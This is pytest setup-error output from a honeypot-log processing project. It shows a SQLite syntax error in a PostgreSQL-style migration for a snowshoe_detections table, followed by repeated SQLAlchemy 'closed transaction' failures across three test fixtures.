/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b26f3150>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:41:46,220:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:46,220:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:46,221:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:46,221:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:46,228:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:46,228:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:46,229:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:46,229:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:46,231:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:46,231:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:46,233:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:46,233:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:46,236:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:46,236:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:46,238:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:46,238:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:46,239:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:46,239:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:46,240:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:46,240:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:46,242:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:46,242:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:46,243:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:46,243:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:46,244:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:46,244:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:46,245:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:46,245:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:46,246:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,246:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,247:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,247:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,248:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,248:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,249:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,249:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,249:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,249:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,250:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:41:46,250:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
___ ERROR at setup of TestEndToEndIntegration.test_full_enrichment_pipeline ____

    @pytest.fixture
    def test_db() -> None:
        """Create a test database with SSH key intelligence schema."""
        engine = create_engine("sqlite:///:memory:", echo=False)
    
        # Apply migrations to create all tables including SSH key intelligence
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_ssh_key_enrichment.py:30: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b2abc830>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:41:46,661:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:46,661:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:46,662:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:46,662:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:46,669:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:46,669:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:46,671:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:46,671:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:46,672:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:46,672:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:46,674:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:46,674:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:46,675:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:46,675:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:46,678:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:46,678:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:46,679:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:46,679:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:46,680:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:46,680:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:46,682:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:46,682:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:46,685:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:46,685:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:46,685:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:46,685:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:46,686:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:46,686:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:46,687:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,687:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,688:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,688:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,688:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,688:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,689:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,689:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,692:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,692:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:46,692:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:41:46,692:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_ ERROR at setup of TestFilesBackfillPerformance.test_bulk_loader_performance __

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_bulk_loader_performance0')

    @pytest.fixture
    def performance_engine(tmp_path):
        """Create database engine optimized for performance testing."""
        db_path = tmp_path / "perf_test.db"
        engine = create_engine_from_settings(load_database_settings())
        # Override with test database path
        from sqlalchemy import create_engine
    
        engine = create_engine(f"sqlite:///{db_path}")
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/performance/test_files_backfill.py:53: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b230e350>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:42:16,947:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
